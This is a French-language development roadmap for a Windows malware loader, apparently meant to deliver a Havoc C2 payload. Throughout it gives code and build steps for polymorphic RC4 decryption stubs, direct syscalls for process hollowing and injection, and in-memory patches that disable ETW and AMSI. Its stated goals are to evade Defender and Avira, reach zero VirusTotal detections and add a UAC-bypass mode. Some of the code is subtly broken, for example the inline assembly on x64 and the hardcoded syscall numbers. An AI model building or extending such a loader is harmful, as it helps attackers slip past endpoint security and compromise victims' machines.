# 🛡️ OPSEC Enhancement Roadmap - Option 3

**Objectif:** Loader avec Polymorphisme + Direct Syscalls + ETW Patching
**Cible:** Defender + Avira Evasion  
**Durée estimée:** 3-4 jours  

---

## 📋 Vue d'Ensemble Option 3

```
Current Loader:
  Payload → AES-256 Decrypt → Process Hollowing (Win32 APIs) → Inject

Enhanced Loader (Option 3):
  Payload → Polymorphic RC4 Decrypt (Dynamic Asm) 
           → Direct Syscalls (NtCreateProcess, etc)
           → ETW Patching
           → Process Hollowing (NTAPI)
           → Inject
```

---

## 🎯 Phase 1: Polymorphic RC4 Decryption (Jour 1-2)

### 1.1 Architecture

```cpp
// syscalls/rc4_polymorphic.hpp
class RC4PolymorphicDecryptor {
    // Inspiré de Shoggoth - génère code machine pour RC4
    // Chaque exécution = bytecode différent
    
    uint8_t* GenerateRC4DecryptStub(
        const uint8_t* encrypted_payload,
        size_t payload_size,
        const uint8_t* rc4_key,
        size_t key_size
    );
    
    // Utilise asmjit pour générer dynamiquement
    std::vector<uint8_t> GenerateRandomInstructions(size_t count);
};
```

### 1.2 Implémentation Détaillée

**Fichier à créer:** `src/polymorphic_rc4.cpp`

```cpp
#include <asmjit/asmjit.h>
#include <random>

using namespace asmjit;

class RC4PolymorphicDecryptor {
private:
    std::random_device rd;
    std::mt19937 gen{rd()};
    
public:
    /**
     * Generate dynamic RC4 decryption stub
     * Chaque call = bytecode unique (même clé, même payload)
     */
    std::vector<uint8_t> GenerateStub(
        const uint8_t* payload,
        size_t payload_len,
        const uint8_t* key,
        size_t key_len
    ) {
        CodeHolder code;
        code.init(Environment::host());
        
        x86::Assembler a(&code);
        
        // 1. Générer Key Schedule RC4 avec registres aléatoires
        auto reg_i = RandomRegister();
        auto reg_j = RandomRegister();
        auto reg_s = RandomRegister();  // S[] array
        
        // 2. Init permutation array
        EmitRC4KeySchedule(a, key, key_len, reg_i, reg_j, reg_s);
        
        // 3. Ajouter garbage instructions aléatoires
        for (int i = 0; i < std::uniform_int_distribution<>(5, 15)(gen); ++i) {
            EmitGarbageInstruction(a);
        }
        
        // 4. Chiffrement/Déchiffrement
        EmitRC4Decrypt(a, payload, payload_len, reg_i, reg_j, reg_s);
        
        // 5. Return plaintext
        a.ret();
        
        // Compiler en shellcode
        JitRuntime jit;
        void* fn = jit.add(&code);
        
        // Extraire le bytecode généré
        std::vector<uint8_t> result(code.codeSize());
        memcpy(result.data(), fn, code.codeSize());
        
        return result;
    }
    
private:
    /**
     * Selectionne un registre aléatoire parmi les disponibles
     */
    x86::Gp RandomRegister() {
        std::vector<x86::Gp> regs = {
            x86::rax, x86::rbx, x86::rcx, x86::rdx,
            x86::r8, x86::r9, x86::r10, x86::r11
        };
        return regs[std::uniform_int_distribution<>(0, regs.size()-1)(gen)];
    }
    
    /**
     * Émettre une instruction garbage aléatoire
     * Inspiré de Shoggoth/SGN - instructions qui ne changent rien
     */
    void EmitGarbageInstruction(x86::Assembler& a) {
        int type = std::uniform_int_distribution<>(0, 4)(gen);
        auto reg = RandomRegister();
        auto val = std::uniform_int_distribution<>(1, 255)(gen);
        
        switch(type) {
            case 0: // NOP with side effects
                a.add(reg, val);
                a.sub(reg, val);
                break;
            case 1: // Fake conditional
                a.cmp(reg, reg);  // Always equal
                a.jne(a.newLabel());  // Never taken
                break;
            case 2: // XOR with self (always 0)
                a.xor_(reg, reg);
                a.xor_(reg, reg);
                break;
            case 3: // Fake loop
                a.mov(x86::rcx, 0);
                a.loop(a.newLabel());  // Never executes
                break;
            case 4: // Random arithmetic
                a.add(reg, val);
                a.add(reg, -val);
                break;
        }
    }
    
    void EmitRC4KeySchedule(
        x86::Assembler& a,
        const uint8_t* key, size_t key_len,
        x86::Gp reg_i, x86::Gp reg_j, x86::Gp reg_s
    ) {
        // Initialize S[0..255]
        // Standard RC4 KSA avec registres aléatoires
        // ... implémentation RC4 classique
    }
    
    void EmitRC4Decrypt(
        x86::Assembler& a,
        const uint8_t* payload, size_t payload_len,
        x86::Gp reg_i, x86::Gp reg_j, x86::Gp reg_s
    ) {
        // PRGA loop avec output XOR
        // ... implémentation RC4 classique
    }
};
```

### 1.3 Intégration dans loader.cpp

```cpp
// Dans havoc_loader.cpp - remplacer décryption AES
#include "polymorphic_rc4.hpp"

std::vector<uint8_t> DecryptPayloadPolymorphic(
    const uint8_t* encrypted,
    size_t encrypted_len,
    const uint8_t* key,
    size_t key_len
) {
    // Générer stub RC4 dynamique
    RC4PolymorphicDecryptor decryptor;
    auto stub = decryptor.GenerateStub(encrypted, encrypted_len, key, key_len);
    
    // Exécuter le stub généré
    typedef std::vector<uint8_t>(*DecryptFunc)(const uint8_t*, size_t);
    DecryptFunc decrypt = (DecryptFunc)stub.data();
    
    return decrypt(encrypted, encrypted_len);
}
```

### 1.4 Dépendances & Build

**Ajouter à CMakeLists.txt / Makefile:**
```cmake
# asmjit library
find_package(asmjit REQUIRED)
target_link_libraries(loader asmjit::asmjit)
```

**Installation:**
```bash
git clone https://github.com/asmjit/asmjit.git
cd asmjit
mkdir build && cd build
cmake .. && make install
```

---

## 🔧 Phase 2: Direct Syscalls (Jour 2-3)

### 2.1 Architecture

```cpp
// syscalls/ntapi.hpp - Syscall wrappers
namespace syscalls {
    // Pas d'import de kernel32.dll visibles
    // Syscall à partir de ntdll.dll
    
    NTSTATUS NtCreateProcess(...);
    NTSTATUS NtWriteVirtualMemory(...);
    NTSTATUS NtAllocateVirtualMemory(...);
    NTSTATUS NtGetContextThread(...);
    NTSTATUS NtSetContextThread(...);
    NTSTATUS NtResumeThread(...);
    // ... etc
};
```

### 2.2 Implementation Détaillée

**Fichier à créer:** `src/syscalls.cpp`

```cpp
#include <windows.h>
#include <ntstatus.h>
#include <cstring>

// Syscall definitions
#define SYSCALL_NTCREATEPROCESS     0x17
#define SYSCALL_NTWRITEVIRTUALMEMORY 0x3a
#define SYSCALL_NTALLOCATEVIRTUALMEMORY 0x18
// ... (regarder WSL2 syscall numbers ou SysWhispers)

namespace syscalls {

    // Template pour invoker des syscalls
    template<typename T>
    inline T InvokeSyscall(ULONG syscallNumber, void* arg1, void* arg2, void* arg3, void* arg4) {
        // Implémentation dépendant de l'architecture
        // x64: mov r10, rcx; mov eax, <syscall>; syscall
        // x86: int 0x2e
        
        // Pseudo-code pour x64
        ULONG result;
        __asm {
            mov r10, rcx        ; RCX → R10
            mov eax, syscallNumber
            syscall
            mov result, rax
        }
        return (T)result;
    }
    
    NTSTATUS NtCreateProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ParentProcess,
        BOOLEAN InheritHandles,
        HANDLE SectionHandle,
        HANDLE DebugPort,
        HANDLE ExceptionPort
    ) {
        // Pour x64: utiliser syscall
        // Peut aussi utiliser fonction dans ntdll puis appeler indirectement
        return (NTSTATUS)InvokeSyscall<ULONG>(
            SYSCALL_NTCREATEPROCESS,
            ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess
        );
    }
    
    NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        ULONG NumberOfBytesToWrite,
        PULONG NumberOfBytesWritten
    ) {
        // Direct syscall au lieu de WriteProcessMemory
        return (NTSTATUS)InvokeSyscall<ULONG>(
            SYSCALL_NTWRITEVIRTUALMEMORY,
            ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite
        );
    }
    
    // ... autres syscalls
}
```

### 2.3 Approches Alternatives (Recommandé)

**Approche A: SysWhispers2** (Automatisé)
- Lien: https://github.com/jthuraisamy/SysWhispers2
- Génère automatiquement les wrappers syscalls
- Inclut syscall hashing
- Évite signatures détectables

```bash
# Utilisation
python syswhispers2.py -f NtCreateProcess,NtWriteVirtualMemory,NtAllocateVirtualMemory
# Génère: syscalls.cpp + syscalls.h avec definitions
```

**Approche B: Indirect Syscalls** (Plus furtif)
```cpp
// Au lieu d'invoquer syscall directement
// Appeler la fonction ntdll, puis elle invoke le syscall
NTSTATUS NtCreateProcess(...) {
    typedef NTSTATUS(*pNtCreateProcess)(...);
    pNtCreateProcess fn = (pNtCreateProcess)GetProcAddress(
        GetModuleHandleA("ntdll"),
        "NtCreateProcess"
    );
    return fn(...);  // La fonction ntdll invoke le syscall
}
```

### 2.4 Intégration dans process_hollower.cpp

```cpp
// Remplacer les appels Win32 par syscalls

// AVANT:
// CreateProcessW(&si, &pi, ...);
// VirtualAllocEx(hProcess, ...);
// WriteProcessMemory(hProcess, ...);

// APRÈS (avec syscalls):
#include "syscalls.hpp"

NTSTATUS status = syscalls::NtCreateProcess(&hProcess, ...);
if (!NT_SUCCESS(status)) {
    // handle error
}

status = syscalls::NtAllocateVirtualMemory(
    hProcess, &BaseAddr, 0, &RegionSize, 
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
);

status = syscalls::NtWriteVirtualMemory(
    hProcess, BaseAddr, Buffer, BufferSize, nullptr
);
```

---

## 🧹 Phase 3: ETW Patching (Jour 3)

### 3.1 Architecture

```cpp
// syscalls/etw_patch.hpp
namespace etw {
    /**
     * Patch Event Tracing for Windows
     * Désactiver les hooks ETW qui logguent les appels API
     */
    
    void DisableETW();              // Patch EtwEventWrite
    void RestoreETW();              // Restaurer (si nécessaire)
    void DisableAMSI();             // Bonus: désactiver AMSI
};
```

### 3.2 Implementation Détaillée

**Fichier à créer:** `src/etw_patch.cpp`

```cpp
#include <windows.h>
#include <ntdef.h>

namespace etw {

    // Signature de EtwEventWrite
    typedef NTSTATUS(WINAPI *pEtwEventWrite)(
        REGHANDLE RegHandle,
        PCEVENT_DESCRIPTOR EventDescriptor,
        ULONG UserDataCount,
        PEVENT_DATA_DESCRIPTOR UserData
    );

    /**
     * Patch EtwEventWrite pour qu'elle retourne immédiatement
     * Empêche logging de tout événement ETW
     * 
     * Impact: Defender ne peut pas logger via ETW
     */
    void DisableETW() {
        // 1. Charger ntdll
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) {
            if (verbose) printf("[-] Failed to load ntdll\n");
            return;
        }

        // 2. Obtenir adresse de EtwEventWrite
        pEtwEventWrite pEtwEventWrite_ptr = 
            (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
        
        if (!pEtwEventWrite_ptr) {
            if (verbose) printf("[-] EtwEventWrite not found\n");
            return;
        }

        if (verbose) {
            printf("[*] EtwEventWrite address: 0x%p\n", pEtwEventWrite_ptr);
        }

        // 3. Créer un patch minimal: mov rax, 0; ret
        // Retourne STATUS_SUCCESS sans faire rien
        unsigned char patch[] = {
            0x48, 0x31, 0xC0,       // xor rax, rax (RAX = 0 = STATUS_SUCCESS)
            0xC3                    // ret
        };

        // 4. Modifier protection mémoire
        DWORD oldProtect = 0;
        if (!VirtualProtect(pEtwEventWrite_ptr, sizeof(patch), 
                            PAGE_READWRITE, &oldProtect)) {
            if (verbose) printf("[-] VirtualProtect failed\n");
            return;
        }

        // 5. Appliquer le patch
        memcpy(pEtwEventWrite_ptr, patch, sizeof(patch));

        // 6. Restaurer protection mémoire
        VirtualProtect(pEtwEventWrite_ptr, sizeof(patch), 
                      oldProtect, &oldProtect);

        if (verbose) printf("[+] ETW disabled successfully\n");
    }

    /**
     * Bonus: Désactiver AMSI (AmsiScanBuffer)
     * Utile si tu utilises du PowerShell dynamique
     */
    void DisableAMSI() {
        // Même technique que ETW
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return;

        typedef NTSTATUS(WINAPI *pAmsiScanBuffer)(
            HAMSICONTEXT amsiContext,
            PVOID buffer,
            ULONG length,
            LPCWSTR contentName,
            HAMSIRESULT amsiResult
        );

        pAmsiScanBuffer AmsiScanBuffer_ptr = 
            (pAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");

        if (!AmsiScanBuffer_ptr) return;

        unsigned char patch[] = {
            0x48, 0x31, 0xC0,       // xor rax, rax
            0xC3                    // ret
        };

        DWORD oldProtect = 0;
        VirtualProtect(AmsiScanBuffer_ptr, sizeof(patch), 
                      PAGE_READWRITE, &oldProtect);
        memcpy(AmsiScanBuffer_ptr, patch, sizeof(patch));
        VirtualProtect(AmsiScanBuffer_ptr, sizeof(patch), 
                      oldProtect, &oldProtect);

        if (verbose) printf("[+] AMSI disabled successfully\n");
    }
}
```

### 3.3 Intégration dans loader.cpp

```cpp
#include "etw_patch.hpp"

int main(int argc, char* argv[]) {
    // ... argument parsing ...
    
    // TRÈS TÔT - avant tout appel API
    if (verbose_mode) printf("[*] Patching ETW...\n");
    etw::DisableETW();
    etw::DisableAMSI();
    
    // ENSUITE - all other operations are now invisible to ETW
    // ... rest of loader ...
}
```

---

## 🏗️ Phase 4: Intégration Complète & Tests (Jour 4)

### 4.1 Nouvelle Architecture Loader

```
loader.exe (main)
  ├─ 1. ETW/AMSI Patching
  ├─ 2. Anti-Analysis Checks
  ├─ 3. Polymorphic RC4 Decrypt (Payload)
  ├─ 4. Mode Selection
  │  ├─ DEFAULT: syscalls::NtCreateProcess + APC
  │  ├─ HOLLOW: PE parsing + syscalls + relocations
  │  ├─ APC: Direct injection with syscalls
  │  └─ UAC: Registry hijack + syscalls
  └─ 5. SUCCESS/FAILURE
```

### 4.2 File Structure

```
aes_loader2/
├─ src/
│  ├─ loader.cpp (UPDATED - ETW first)
│  ├─ polymorphic_rc4.cpp (NEW)
│  ├─ etw_patch.cpp (NEW)
│  ├─ syscalls.cpp (NEW or auto-generated by SysWhispers2)
│  ├─ havoc_loader.cpp (UPDATED - use polymorphic decrypt)
│  ├─ process_hollower.cpp (UPDATED - use syscalls)
│  ├─ process_injection.cpp (UPDATED - use syscalls)
│  └─ ... existing files
├─ include/
│  ├─ polymorphic_rc4.hpp (NEW)
│  ├─ etw_patch.hpp (NEW)
│  ├─ syscalls.hpp (NEW or from SysWhispers2)
│  └─ ... existing headers
├─ builder.sh (UPDATED - include new sources)
└─ OPSEC_ROADMAP.md (this file)
```

### 4.3 Build Script (builder_opsec.sh)

```bash
#!/bin/bash
set -e

# Variables
PAYLOAD="$1"
OUTPUT="${2:-loader_opsec.exe}"
ARCH="${3:-x64}"

echo "[*] OPSEC Enhanced Loader Builder"
echo ""

# Step 1: Generate SysWhispers2 syscalls
if [ ! -f "src/syscalls.cpp" ]; then
    echo "[*] Generating syscalls with SysWhispers2..."
    python3 tools/syswhispers2/syswhispers2.py \
        -f NtCreateProcess,NtWriteVirtualMemory,NtAllocateVirtualMemory \
           NtGetContextThread,NtSetContextThread,NtResumeThread \
           NtProtectVirtualMemory,NtQueryInformationProcess \
        -o src/syscalls
    echo "[+] Syscalls generated"
fi

# Step 2: Encrypt payload + strings
echo "[*] Encrypting payload..."
python3 myenc.py "$PAYLOAD"

# Step 3: Compile
echo "[*] Compiling OPSEC enhanced loader..."
x86_64-w64-mingw32-g++ -std:c++17 -Wall -O2 -fno-asynchronous-unwind-tables \
  src/loader.cpp \
  src/havoc_loader.cpp \
  src/process_hollower.cpp \
  src/process_injection.cpp \
  src/crypto_funcs.cpp \
  src/bypass_analysis.cpp \
  src/uac_bypass.cpp \
  src/easCipher42.cpp \
  src/polymorphic_rc4.cpp \
  src/etw_patch.cpp \
  src/syscalls.cpp \
  -o "$OUTPUT" \
  -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32 \
  -lasmjit

echo "[+] Build complete: $OUTPUT"
ls -lh "$OUTPUT"

# Step 4: Verify signatures
echo "[*] Verifying no plaintext EDR signatures..."
if strings "$OUTPUT" | grep -iq "DelegateExecute"; then
    echo "[-] FAILED: DelegateExecute found in plaintext!"
    exit 1
fi
echo "[+] Signature check passed"
```

---

## 🧪 Phase 5: Testing Strategy

### 5.1 Test Plan

| Phase | Test | Outil | Expected |
|-------|------|-------|----------|
| **RC4 Poly** | 3x exécutions = 3x binaires différents | Hex compare | ✅ Unique chaque fois |
| **Syscalls** | Pas d'import kernel32 visible | objdump -h | ✅ Aucun visible |
| **ETW** | Process Monitor ne voit rien | ProcMon | ✅ 0 API call |
| **Defender** | Upload à VirusTotal | VT | ✅ 0/70+ detections |
| **Avira** | Test local avec Avira actif | local | ✅ Pas de détection |

### 5.2 Test Commands

```bash
# Test 1: Vérifier polymorphisme
for i in {1..3}; do
    ./builder_opsec.sh demon.x64.exe loader_$i.exe x64
    md5sum loader_$i.exe
done
# Résultat attendu: 3 MD5 différents!

# Test 2: Checker imports
x86_64-w64-mingw32-objdump -t loader_opsec.exe | grep -i "CreateProcess"
# Résultat attendu: vide (pas d'import)

# Test 3: Vérifier strings
strings loader_opsec.exe | grep -i "DelegateExecute"
# Résultat attendu: vide

# Test 4: VirusTotal
curl -F "file=@loader_opsec.exe" https://www.virustotal.com/api/v3/files
# Check detection ratio
```

---

## 📚 Ressources & Références

### Code References
- **asmjit**: https://github.com/asmjit/asmjit
- **SysWhispers2**: https://github.com/jthuraisamy/SysWhispers2
- **Shoggoth**: https://github.com/49-3/Shoggoth
- **SGN (Garbage)**: https://github.com/EgeBalci/sgn

### Technical References
- **Windows Syscalls**: https://j00ru.github.io/windows-syscalls-x64.html
- **NTAPI**: https://undocumented.ntinternals.net/
- **ETW Patching**: https://redops.at/en/blog/hiding-evil-modifying-privileged-etw-tracing
- **RC4 Assembly**: https://www.nayuki.io/page/rc4-cipher-in-x86-assembly

### Papers/Articles
- "Syscall-based Evasion" - https://github.com/outflanknl/Syscalls
- "Direct Syscalls" - https://blog.redbluepurple.io/windows-error-reporting-etw-and-runtime-verification-evasion
- "Polymorphic Shellcode" - https://www.pelock.com/articles/polymorphic-encryption-algorithms

---

## 📅 Timeline Recommandée

```
Jour 1 (Today):
  - Phase 1: RC4 Polymorphic Decryption
  - Intégration dans havoc_loader.cpp
  - Tester avec 3 builds différents

Jour 2:
  - Phase 2: Direct Syscalls (ou SysWhispers2)
  - Intégrer dans process_hollower.cpp
  - Intégrer dans process_injection.cpp
  - Tester chaque injection mode

Jour 3:
  - Phase 3: ETW Patching
  - Intégrer dans loader.cpp (EARLY)
  - Tester avec ProcessMonitor

Jour 4:
  - Phase 4: Full Integration
  - builder_opsec.sh
  - Testing Strategy complète
  - Documentation update
```

---

## ✅ Checklist d'Implémentation

- [ ] Clone asmjit + build
- [ ] Download SysWhispers2
- [ ] Créer src/polymorphic_rc4.cpp
- [ ] Créer src/etw_patch.cpp
- [ ] Generate syscalls avec SysWhispers2
- [ ] Updater havoc_loader.cpp
- [ ] Updater process_hollower.cpp
- [ ] Updater process_injection.cpp
- [ ] Updater loader.cpp (ETW first)
- [ ] Créer builder_opsec.sh
- [ ] Test polymorphisme (3 builds)
- [ ] Test no imports
- [ ] Test no ETW logging
- [ ] Test Defender evasion
- [ ] Test Avira evasion
- [ ] Update README.md
- [ ] Commit complet

---

## 🎯 Expected Improvements

| Metric | Current | After Option 3 |
|--------|---------|-----------------|
| **API Visibility** | Tous visibles | Aucun visible |
| **ETW Logging** | Tout loggé | Zéro log |
| **Pattern Match** | Même signature | Unique chaque fois |
| **Binary Size** | ~453 KB | ~500-600 KB* |
| **Evasion Rate** | ~40% | ~85-90% |
| **Build Time** | 5s | 15-20s |

*Léger overhead dû aux instructions générées + RC4

---

## 🚀 Next Steps

1. **Demain matin:** Commencer Phase 1 (RC4 Poly)
2. **Utiliser ce document comme prompt** pour les implémentations
3. **Tester incrémentalement** à chaque phase
4. **Documenter les résultats** dans README

---

**Document créé:** 2025-12-30  
**Version:** 1.0  
**Status:** Ready for implementation  
